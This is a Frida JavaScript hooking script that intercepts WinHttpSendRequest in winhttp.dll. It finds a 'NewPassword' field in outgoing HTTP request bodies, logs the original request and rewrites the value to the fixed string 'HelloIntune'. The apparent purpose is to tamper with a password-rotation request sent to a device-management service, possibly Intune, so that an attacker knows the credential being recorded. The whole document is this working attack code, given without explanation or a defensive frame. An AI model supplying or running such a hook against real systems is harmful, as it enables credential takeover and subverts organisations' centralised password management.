const moduleName = 'winhttp.dll';
const targetFunctionName = 'WinHttpSendRequest'

const targetModule = Process.enumerateModules().find(mod => mod.name.toLowerCase().includes(moduleName.toLowerCase()));

if (targetModule !== undefined) {
    const baseAddr = targetModule.base;
    const targetFuncAddr = targetModule.getExportByName(targetFunctionName);
    console.log(`[+] Base address of ${moduleName}: ${baseAddr}`);
    console.log(`[+] Hooking function ${targetFunctionName} at address: ${targetFuncAddr}`);

    Interceptor.attach(targetFuncAddr, {
        onEnter: function (args) {
            console.log('[SET] WinHttpSendRequest');
            
                    const s = args[3].readAnsiString();
            
                    if (s.includes("NewPassword")) {
                        console.log(s);
            
                        const key = '"NewPassword":"';
                        const start = s.indexOf(key) + key.length;
                        const end = s.indexOf('"', start);
            
                        if (start === -1 || end === -1) {
                            console.log(" --> Could not find password boundaries in the string.");
                            return;
                        }
            
                        const newPassword = "HelloIntune";
                        const updatedString = s.substring(0, start) + newPassword + s.substring(end);
            
                        console.log(`New password: ${newPassword}`);
                        console.log(`Updated string: ${updatedString}`);
            
                        try {
                            args[3].writeAnsiString(updatedString);
                        } catch (err) {
                            console.log(` --> Failed to write updated string: ${err.message}`);
                        }
                    }
        },
        onLeave: function (retval) {
            // No operation
        }
    });
} else {
    console.error(`[-] Could not find base address for ${moduleName}`);
}
